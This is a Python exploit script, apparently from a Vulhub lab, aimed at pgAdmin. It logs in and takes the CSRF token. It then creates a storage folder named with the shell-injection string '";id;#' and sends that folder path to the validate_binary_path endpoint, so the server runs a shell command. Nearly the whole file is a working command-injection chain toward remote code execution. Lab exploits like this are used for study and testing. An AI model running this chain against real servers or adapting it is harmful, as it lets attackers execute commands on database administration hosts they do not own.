import os
import time

import requests

target_url = os.environ.get("TARGET_URL", None)

if target_url is None:
    print("TARGET_URL is not set")
    exit(1)


print(target_url)


session = requests.Session()
csrf = ""


def execute():
    global session
    global csrf
    headers = {
        "User-Agent": "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
    }
    res = session.get(
        f"{target_url}/login",
        headers=headers,
    )
    # csrf = res.json()["response"]["csrf_token"]
    content = res.text
    csrf = content.partition('csrfToken":')[2].partition('"')[2].partition('"')[0]
    print(csrf)


def login():
    global session
    global csrf
    headers = {
        "User-Agent": "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
    }
    res = session.post(
        f"{target_url}/authenticate/login",
        headers=headers,
        data={
            "csrf_token": csrf,
            "email": "vulhub@example.com",
            "password": "vulhub",
            "language": "en",
            "internal_button": "Login",
        },
    )
    print(res.content)


filename = ""


def add_file():
    global session
    global csrf
    global filename

    headers = {
        "User-Agent": "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        "X-pgA-CSRFToken": csrf,
    }

    res = session.post(
        f"{target_url}/file_manager/init",
        headers=headers,
        json={
            "dialog_type": "storage_dialog",
            "supported_types": ["sql", "csv", "json", "*"],
            "dialog_title": "Storage Manager",
        },
    )
    data = res.json()

    print(data)
    filename = data["data"]["transId"]


def first_operation():
    global session
    global csrf
    global filename

    headers = {
        "User-Agent": "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        "X-pgA-CSRFToken": csrf,
    }

    res = session.post(
        f"{target_url}/file_manager/filemanager/{filename}",
        headers=headers,
        json={
            "path": "/",
            "mode": "getfolder",
            "file_type": "*",
            "show_hidden": False,
            "storage_folder": "",
        },
    )
    print(res.json())


def second_operation():
    global session
    global csrf
    global filename

    headers = {
        "User-Agent": "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        "X-pgA-CSRFToken": csrf,
    }

    res = session.post(
        f"{target_url}/file_manager/save_last_dir/{filename}",
        headers=headers,
        json={"path": "/", "storage_folder": ""},
    )
    print(res.json())


def third_operation():
    global session
    global csrf
    global filename

    headers = {
        "User-Agent": "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        "X-pgA-CSRFToken": csrf,
    }

    res = session.post(
        f"{target_url}/file_manager/filemanager/{filename}",
        headers=headers,
        json={
            "path": "/",
            "mode": "addfolder",
            "name": '";id;#',
            "storage_folder": "my_storage",
        },
    )
    print(res.json())


def fourth_operation():
    global session
    global csrf
    global filename

    headers = {
        "User-Agent": "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        "X-pgA-CSRFToken": csrf,
    }

    res = session.delete(
        f"{target_url}/file_manager/delete_trans_id/{filename}",
        headers=headers,
    )
    print(res.json())


def gg():
    global session
    global csrff

    headers = {
        "User-Agent": "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        "X-pgA-CSRFToken": csrf,
    }

    res = session.post(
        f"{target_url}/misc/validate_binary_path",
        headers=headers,
        json={"utility_path": '/var/lib/pgadmin/storage/vulhub_example.com/";id;#'},
    )
    print(res.json())


urls = [
    execute,
    login,
    add_file,
    first_operation,
    second_operation,
    third_operation,
    fourth_operation,
    gg,
]

all_time = 5
sleep_time = all_time // len(urls)

for url in urls:
    print(f"sleeping for {sleep_time}.")
    time.sleep(sleep_time)

    url()


print(f"sleeping for {sleep_time}.")
time.sleep(sleep_time)
